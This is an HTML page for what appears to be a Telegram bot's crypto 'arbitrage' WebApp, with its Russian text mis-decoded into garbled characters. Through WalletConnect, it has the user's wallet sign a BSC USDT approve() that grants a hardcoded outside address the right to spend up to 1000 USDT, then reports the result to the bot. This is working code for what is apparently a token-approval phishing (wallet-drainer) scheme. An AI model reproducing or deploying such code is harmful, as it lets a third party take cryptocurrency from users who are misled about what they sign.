<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <title>Approve 1000 USDT</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 1rem;
      background: #f7f7f7;
      color: #333;
    }
    h2 {
      margin-top: 0;
    }
    #qr-container {
      text-align: center;
      margin-top: 1rem;
    }
    #status {
      margin-top: 1rem;
      white-space: pre-line;
      text-align: center;
      font-size: 0.95rem;
    }
    #btn-close {
      margin: 2rem auto 0 auto;
      display: none;
      padding: 0.5rem 1rem;
      background: #0088cc;
      color: #fff;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      font-size: 1rem;
      text-align: center;
    }
    #btn-close:hover {
      background: #0077b3;
    }
  </style>
</head>
<body>
  <h2>Approve 1000 USDT</h2>
  <p>
    –û—Ç—Å–∫–∞–Ω–∏—Ä—É–π—Ç–µ QR‚Äë–∫–æ–¥ –≤ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ–º–æ–º –∫–æ—à–µ–ª—å–∫–µ (Trust Wallet, MetaMask –∏ —Ç.‚ÄØ–ø.)<br>
    –∏ –ø–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é APPROVE.
  </p>
  <div id="qr-container">
    <canvas id="qr-canvas"></canvas>
  </div>
  <div id="status">–ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º WalletConnect v2 —Å–µ—Å—Å–∏—é‚Ä¶</div>
  <button id="btn-close">–ó–∞–∫—Ä—ã—Ç—å</button>

  <!-- 1) –ü–æ–¥–∫–ª—é—á–∞–µ–º WalletConnect SignClient v2 –∏–∑ CDN -->
  <script src="https://unpkg.com/@walletconnect/sign-client@2.21.0/dist/sign-client.umd.min.js"></script>
  <!-- 2) –ü–æ–¥–∫–ª—é—á–∞–µ–º qrcode.js -->
  <script src="https://unpkg.com/qrcode@1.5.1/build/qrcode.min.js"></script>

  <script>
    (async () => {
      const statusEl = document.getElementById("status");
      const qrCanvas = document.getElementById("qr-canvas");
      const btnClose = document.getElementById("btn-close");

      // –ü—Ä–æ–≤–µ—Ä—è–µ–º, —á—Ç–æ WebApp API –¥–æ—Å—Ç—É–ø–µ–Ω
      if (!window.Telegram || !window.Telegram.WebApp) {
        statusEl.innerText = "‚ùå WebApp API –Ω–µ –¥–æ—Å—Ç—É–ø–µ–Ω.";
        return;
      }
      const tgWebApp = window.Telegram.WebApp;
      tgWebApp.expand(); // —Ä–∞–∑–≤–æ—Ä–∞—á–∏–≤–∞–µ–º –æ–∫–Ω–æ WebApp

      // ‚îÄ‚îÄ‚îÄ 1) –ò–ù–ò–¶–ò–ê–õ–ò–ó–ò–†–£–ï–ú WalletConnect SignClient ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
      let client;
      try {
        client = await SignClient.init({
          projectId: "d868f90cd734355ae0320f8f0258b6b1",
          relayUrl: "wss://relay.walletconnect.com",
          metadata: {
            name:        "CryptoGT Bot",
            description: "Approve USDT via WalletConnect v2",
            url:         `https://t.me/${encodeURIComponent("@cryptogt_arbitrage_bot")}`,
            icons:       []
          }
        });
      } catch (e) {
        statusEl.innerText = "‚ùå –û—à–∏–±–∫–∞ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏ WalletConnect:\n" + e.message;
        return;
      }
      statusEl.innerText = "‚úîÔ∏è WalletConnect –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω. –°–æ–∑–¥–∞—ë–º —Å–µ—Å—Å–∏—é‚Ä¶";

      // ‚îÄ‚îÄ‚îÄ 2) –°–û–ó–î–ê–Å–ú –°–ï–°–°–ò–Æ –ò –ü–û–õ–£–ß–ê–ï–ú URI ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
      let uri, approval;
      try {
        const res = await client.connect({
          requiredNamespaces: {
            eip155: {
              methods: ["eth_sendTransaction"],
              chains:  ["eip155:56"],
              events:  []
            }
          }
        });
        uri = res.uri;
        approval = res.approval;
      } catch (e) {
        statusEl.innerText = "‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å —Å–æ–∑–¥–∞—Ç—å —Å–µ—Å—Å–∏—é:\n" + e.message;
        return;
      }

      // ‚îÄ‚îÄ‚îÄ 3) –†–ï–ù–î–ï–†–ò–ú QR-–ö–û–î ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
      try {
        await QRCode.toCanvas(qrCanvas, uri, { width: 250, margin: 1 });
        statusEl.innerText = "üîó –°–∫–∞–Ω–∏—Ä—É–π—Ç–µ QR‚Äë–∫–æ–¥ –≤ –∫–æ—à–µ–ª—å–∫–µ.";
      } catch (e) {
        statusEl.innerText = "‚ùå –û—à–∏–±–∫–∞ –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ QR:\n" + e.message;
        return;
      }

      // ‚îÄ‚îÄ‚îÄ 4) –ñ–î–Å–ú, –ü–û–ö–ê –ü–û–õ–¨–ó–û–í–ê–¢–ï–õ–¨ –ü–û–î–¢–í–ï–†–î–ò–¢ –°–ï–°–°–ò–Æ ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
      let session;
      try {
        session = await approval();
      } catch (e) {
        statusEl.innerText = "‚ùå –°–µ—Å—Å–∏—è –æ—Ç–º–µ–Ω–µ–Ω–∞ –∏–ª–∏ –æ—à–∏–±–∫–∞:\n" + e.message;
        // –û–ø–æ–≤–µ—â–∞–µ–º –±–æ—Ç–∞ –æ–± –æ—à–∏–±–∫–µ
        tgWebApp.sendData(JSON.stringify({ status: "error", error: e.message }));
        return;
      }
      statusEl.innerText = "‚úîÔ∏è –°–µ—Å—Å–∏—è —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞. –ü–æ–¥–≥–æ—Ç–∞–≤–ª–∏–≤–∞–µ–º —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é‚Ä¶";

      // ‚îÄ‚îÄ‚îÄ 5) –î–ò–ù–ê–ú–ò–ß–ï–°–ö–ò –ü–û–î–ö–õ–Æ–ß–ê–ï–ú Web3.js (–≤–µ—Ä—Å–∏—è 1.10.1) ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
      await loadScript("https://cdn.jsdelivr.net/npm/web3@1.10.1/dist/web3.min.js");
      const web3 = new Web3("https://bsc-dataseed.binance.org/");

      // ‚îÄ‚îÄ‚îÄ 6) –ü–û–î–ì–û–¢–û–í–ö–ê –î–ê–ù–ù–´–• –î–õ–Ø APPROVE ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
      const usdtAddress  = "0x55d398326f99059fF775485246999027b3197955";
      const spenderAddr  = "0xA7acE8F572825FeD4411389Cb1A66104Cf53B577";
      const approveValue = "1000000000000000000000"; // 1000 USDT (18 –¥–µ—Ü.)

      const usdtABI = [
        {
          constant: false,
          inputs: [
            { name: "spender", type: "address" },
            { name: "amount",  type: "uint256" }
          ],
          name: "approve",
          outputs: [{ name: "", type: "bool" }],
          type: "function"
        }
      ];
      const usdtContract = new web3.eth.Contract(usdtABI, usdtAddress);

      // 1) –°—á–∏—Ç—ã–≤–∞–µ–º –∞–¥—Ä–µ—Å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏–∑ session.namespaces.eip155.accounts
      const acct = session.namespaces.eip155.accounts.find(acc => acc.startsWith("eip155:56:"));
      const userAddress = acct.split(":")[2];

      // 2) –ö–æ–¥ approve()
      const dataApprove = usdtContract.methods.approve(spenderAddr, approveValue).encodeABI();

      // 3) Nonce, gasPrice, gasLimit
      let nonce   = await web3.eth.getTransactionCount(userAddress, "pending");
      let gasPrice = await web3.eth.getGasPrice();
      let gasLimit;
      try {
        gasLimit = await web3.eth.estimateGas({
          from: userAddress,
          to:   usdtAddress,
          data: dataApprove
        });
      } catch (e) {
        statusEl.innerText = "‚ùå –û—à–∏–±–∫–∞ –æ—Ü–µ–Ω–∫–∏ –≥–∞–∑–∞:\n" + e.message;
        tgWebApp.sendData(JSON.stringify({ status: "error", error: e.message }));
        return;
      }

      statusEl.innerText =
        `‚ÑπÔ∏è Nonce: ${nonce}\n` +
        `‚ÑπÔ∏è Gas price: ${web3.utils.fromWei(gasPrice, "gwei")} Gwei\n` +
        `‚ÑπÔ∏è Gas limit: ${gasLimit}`;

      // 4) –§–æ—Ä–º–∏—Ä—É–µ–º txParams
      const txParams = {
        from:     userAddress,
        to:       usdtAddress,
        data:     dataApprove,
        gasPrice: web3.utils.toHex(gasPrice),
        gas:      web3.utils.toHex(gasLimit + 10000),
        nonce:    web3.utils.toHex(nonce)
      };

      statusEl.innerText = "‚ñ∂Ô∏è –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é –Ω–∞ –ø–æ–¥–ø–∏—Å—å‚Ä¶";

      // 5) –û—Ç–ø—Ä–∞–≤–ª—è–µ–º eth_sendTransaction
      let txHash;
      try {
        txHash = await client.request({
          topic:   session.topic,
          chainId: "eip155:56",
          request: {
            method: "eth_sendTransaction",
            params: [txParams]
          }
        });
      } catch (e) {
        statusEl.innerText = "‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏:\n" + e.message;
        tgWebApp.sendData(JSON.stringify({ status: "error", error: e.message }));
        return;
      }

      // 6) –£—Å–ø–µ—Ö: –ø–æ–∫–∞–∑—ã–≤–∞–µ–º —Ö—ç—à, –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –±–æ—Ç—É –æ–∫–æ–Ω—á–∞—Ç–µ–ª—å–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ
      statusEl.innerHTML = `‚úÖ APPROVE –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω!<br><code>${txHash}</code>`;
      tgWebApp.sendData(JSON.stringify({ status: "success", txHash }));
      btnClose.style.display = "block";
      btnClose.addEventListener("click", () => tgWebApp.close());
    })();

    // ‚îÄ‚îÄ‚îÄ –í–°–ü–û–ú–û–ì–ê–¢–ï–õ–¨–ù–ê–Ø –§–£–ù–ö–¶–ò–Ø: –ó–ê–ì–†–£–ó–ö–ê –°–ö–†–ò–ü–¢–ê ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
    function loadScript(src) {
      return new Promise((resolve, reject) => {
        const s = document.createElement("script");
        s.src = src;
        s.onload  = () => resolve();
        s.onerror = () => reject(new Error("–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≥—Ä—É–∑–∏—Ç—å " + src));
        document.head.appendChild(s);
      });
    }
  </script>
</body>
</html>
